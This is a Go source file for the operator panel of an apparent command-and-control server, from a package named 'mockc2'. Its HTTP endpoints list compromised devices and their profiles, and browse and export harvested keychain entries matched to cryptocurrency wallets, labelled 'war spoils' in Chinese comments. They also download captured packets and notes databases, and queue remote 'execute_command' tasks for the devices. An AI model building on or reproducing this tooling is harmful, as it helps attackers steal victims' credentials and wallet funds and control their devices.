package server

import (
	"encoding/json"
	"net/http"
	"os"
	"path/filepath"
	"strings"
	"time"

	"mockc2/internal/config"
	"mockc2/internal/store"
)

// 企业后台 panel API —— 全部由 MySQL 索引库解析。

func registerPanel(rt *Router) {
	rt.GET("/panel/api/overview", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		out := map[string]any{"ts": nowString()}
		for k, v := range store.AggStats() {
			out[k] = v
		}
		writeJSON(w, http.StatusOK, out)
	})

	rt.GET("/panel/api/devices", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		writeJSON(w, http.StatusOK, map[string]any{"devices": store.ListDevices()})
	})

	rt.GET("/panel/api/progress", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		writeJSON(w, http.StatusOK, map[string]any{
			"checkpoints": store.StageCheckpointsJSON(),
			"rows":        store.StageProgressRows(),
		})
	})

	rt.GET("/panel/api/device/{uuid}/assets", func(w http.ResponseWriter, r *http.Request, p map[string]string) {
		writeJSON(w, http.StatusOK, store.DeviceAssets(p["uuid"]))
	})

	rt.GET("/panel/api/apps", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		kw := r.URL.Query().Get("kw")
		page := queryInt(r, "page", 1)
		per := queryInt(r, "per", 40)
		out := store.ListApps(kw, page, per)
		out["ep"] = "u"
		writeJSON(w, http.StatusOK, out)
	})

	// war 战果：keychain 钱包命中条目（查库，支持设备/表/钱包/关键词收敛）。
	rt.GET("/panel/api/war", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		kw := r.URL.Query().Get("kw")
		tbl := r.URL.Query().Get("tbl")
		wallet := r.URL.Query().Get("wallet")
		device := r.URL.Query().Get("device")
		page := queryInt(r, "page", 1)
		per := queryInt(r, "per", 40)
		out := store.ListKeychainItems(kw, tbl, wallet, device, page, per)
		out["ep"] = "war"
		writeJSON(w, http.StatusOK, out)
	})

	rt.GET("/panel/api/notes", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		kw := r.URL.Query().Get("kw")
		page := queryInt(r, "page", 1)
		per := queryInt(r, "per", 40)
		writeJSON(w, http.StatusOK, store.ListMemos(kw, page, per))
	})

	// keychain 聚合视图（按设备 / 按钱包规则）
	rt.GET("/panel/api/keychain/devices", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		writeJSON(w, http.StatusOK, map[string]any{"devices": store.KeychainDevices()})
	})

	rt.GET("/panel/api/keychain/wallets", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		writeJSON(w, http.StatusOK, map[string]any{"wallets": store.KeychainWalletSummary()})
	})

	// 单条钱包命中详情（列表点击跳转的解析页数据源）。
	rt.GET("/panel/api/keychain/item/{id}", func(w http.ResponseWriter, r *http.Request, p map[string]string) {
		id, err := parseInt64(p["id"])
		if err != nil || id <= 0 {
			writeJSON(w, http.StatusBadRequest, map[string]any{"error": "bad id"})
			return
		}
		row := store.KeychainItemDetail(id)
		if row == nil {
			writeJSON(w, http.StatusNotFound, map[string]any{"error": "not found"})
			return
		}
		writeJSON(w, http.StatusOK, row)
	})

	// 钱包扫描 JSON 导出（attachment）：?uuid=<dev> 单设备，缺省全设备。
	// 数据来源 keychain_items（仅钱包包名命中行）；full_keychain 不落库。
	rt.GET("/panel/api/keychain/wallet_export", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		data := store.WalletsExport(r.URL.Query().Get("uuid"))
		name := store.ToStr(data["export_name"])
		if name == "" {
			name = "wallet_scan.json"
		}
		w.Header().Set("Content-Disposition", `attachment; filename="`+name+".json"+`"`)
		writeJSON(w, http.StatusOK, data)
	})

	// war 原包下载（attachment）：仅凭 packet_id 取文件，正文不经过库。
	rt.GET("/panel/api/keychain/war_download", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		pid, err := parseInt64(r.URL.Query().Get("packet_id"))
		if err != nil || pid <= 0 {
			writeJSON(w, http.StatusBadRequest, map[string]any{"error": "bad packet_id"})
			return
		}
		row := store.PacketDetail(pid)
		if row == nil {
			writeJSON(w, http.StatusNotFound, map[string]any{"error": "not found"})
			return
		}
		name := filepath.Base(store.ToStr(row["file_path"]))
		w.Header().Set("Content-Disposition", `attachment; filename="`+name+`"`)
		serveFile(w, filepath.Join(config.Get().CaptureRoot,
			filepath.FromSlash(store.ToStr(row["file_path"]))), "", "no-store")
	})

	// 指令结果（result 端点 data 解码落库）
	rt.GET("/panel/api/results", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		kw := r.URL.Query().Get("kw")
		page := queryInt(r, "page", 1)
		per := queryInt(r, "per", 40)
		writeJSON(w, http.StatusOK, store.ListResultData(kw, page, per))
	})

	rt.GET("/panel/api/result/{id}", func(w http.ResponseWriter, r *http.Request, p map[string]string) {
		id, err := parseInt64(p["id"])
		if err != nil || id <= 0 {
			writeJSON(w, http.StatusBadRequest, map[string]any{"error": "bad id"})
			return
		}
		row := store.ResultDetail(id)
		if row == nil {
			writeJSON(w, http.StatusNotFound, map[string]any{"error": "not found"})
			return
		}
		writeJSON(w, http.StatusOK, row)
	})

	// 设备档案（a 端点完整落库）
	rt.GET("/panel/api/profiles", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		writeJSON(w, http.StatusOK, map[string]any{"profiles": store.ListProfiles()})
	})

	rt.GET("/panel/api/commands", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		cur := store.GetQueue().Current()
		if cur == nil {
			cur = map[string]any{}
		}
		writeJSON(w, http.StatusOK, map[string]any{"current": cur, "history": store.CommandRecent(30)})
	})

	rt.POST("/panel/api/commands", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		body := readBody(r)
		o := map[string]any{}
		if len(body) > 0 {
			if json.Unmarshal(body, &o) != nil {
				writeJSON(w, http.StatusBadRequest, map[string]any{"error": "bad json"})
				return
			}
		}
		cmdType := store.ToStr(o["type"])
		if cmdType == "" {
			cmdType = "execute_command"
		}
		once := true
		if v, ok := o["once"].(bool); ok {
			once = v
		}
		var params map[string]any
		if p, ok := o["params"].(map[string]any); ok {
			params = p
		}
		cmd := store.GetQueue().Set(cmdType, params, once, store.ToStr(o["command_id"]))
		cur := store.GetQueue().Current()
		if cur == nil {
			cur = map[string]any{}
		}
		writeJSON(w, http.StatusOK, map[string]any{"ok": true, "command": cmd, "current": cur})
	})

	rt.GET("/panel/api/access", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		n := queryInt(r, "n", 120)
		if n < 10 {
			n = 10
		}
		if n > 500 {
			n = 500
		}
		rows := store.GetDB().Query(
			"SELECT ts, role, method, path, query, host, client, ua, status, cost_ms"+
				" FROM access_log ORDER BY ts_epoch DESC LIMIT ?", n)
		// 反转（老 -> 新）
		for i, j := 0, len(rows)-1; i < j; i, j = i+1, j-1 {
			rows[i], rows[j] = rows[j], rows[i]
		}
		writeJSON(w, http.StatusOK, map[string]any{"rows": rows})
	})

	rt.GET("/panel/api/visits", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		n := queryInt(r, "n", 200)
		if n < 10 {
			n = 10
		}
		if n > 2000 {
			n = 2000
		}
		db := store.GetDB()
		total := store.ToInt(db.QueryOne(
			"SELECT COUNT(DISTINCT CONCAT(ip,'|',COALESCE(device_version,''))) AS n FROM devices")["n"])
		rows := db.Query(
			"SELECT last_seen AS ts, ip, device_version, domain, host, ua"+
				" FROM devices ORDER BY last_seen DESC LIMIT ?", n)
		// 今日新增（first_seen 当日，与仪表盘同口径）
		today := time.Now().Format("2006-01-02")
		todayN := store.ToInt(db.QueryOne(
			"SELECT COUNT(DISTINCT CONCAT(ip,'|',COALESCE(device_version,''))) AS n FROM devices"+
				" WHERE SUBSTR(first_seen,1,10)=?", today)["n"])
		writeJSON(w, http.StatusOK,
			map[string]any{"records": rows, "total": total, "today_visits": todayN})
	})

	rt.GET("/panel/download", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		root := config.Get().CaptureRoot
		if pidStr := r.URL.Query().Get("packet_id"); pidStr != "" {
			pid, err := parseInt64(pidStr)
			if err != nil {
				writeJSON(w, http.StatusBadRequest, map[string]any{"error": "bad packet_id"})
				return
			}
			row := store.PacketDetail(pid)
			if row == nil {
				writeJSON(w, http.StatusNotFound, map[string]any{"error": "not found"})
				return
			}
			serveFile(w, filepath.Join(root, filepath.FromSlash(store.ToStr(row["file_path"]))), "", "no-store")
			return
		}
		ep := r.URL.Query().Get("ep")
		name := r.URL.Query().Get("name")
		if ep == "notesdb" {
			dbDir := filepath.Join(root, "notes_db")
			var hits []string
			_ = filepath.WalkDir(dbDir, func(p string, d os.DirEntry, err error) error {
				if err == nil && !d.IsDir() && d.Name() == name {
					hits = append(hits, p)
				}
				return nil
			})
			if len(hits) == 0 {
				writeJSON(w, http.StatusNotFound, map[string]any{"error": "not found"})
				return
			}
			serveFile(w, hits[0], "", "no-store")
			return
		}
		path := filepath.Join(root, ep, name)
		rel, err := filepath.Rel(root, path)
		if err != nil || strings.HasPrefix(rel, "..") {
			writeJSON(w, http.StatusForbidden, map[string]any{"error": "forbidden"})
			return
		}
		if !isFile(path) {
			writeJSON(w, http.StatusNotFound, map[string]any{"error": "not found"})
			return
		}
		dl := "inline"
		if ep == "u" || ep == "war" || ep == "notesdb" {
			dl = "attachment"
		}
		w.Header().Set("Content-Disposition", dl+`; filename="`+name+`"`)
		serveFile(w, path, "", "no-store")
	})
}

// 统一入口页（无鉴权敏感内容；/console → 两套控制台导航）
func registerPanelEntry(rt *Router) {
	rt.GET("/console", func(w http.ResponseWriter, r *http.Request, _ map[string]string) {
		serveFile(w, filepath.Join(config.Get().DashboardDir, "console.html"), "text/html", "no-store")
	})
}

func pageRange(page, per, total int) (int, int) {
	start := (page - 1) * per
	if start < 0 {
		start = 0
	}
	if start > total {
		start = total
	}
	end := start + per
	if end > total {
		end = total
	}
	return start, end
}

func asSlice(v any) []any {
	if s, ok := v.([]any); ok {
		return s
	}
	return nil
}
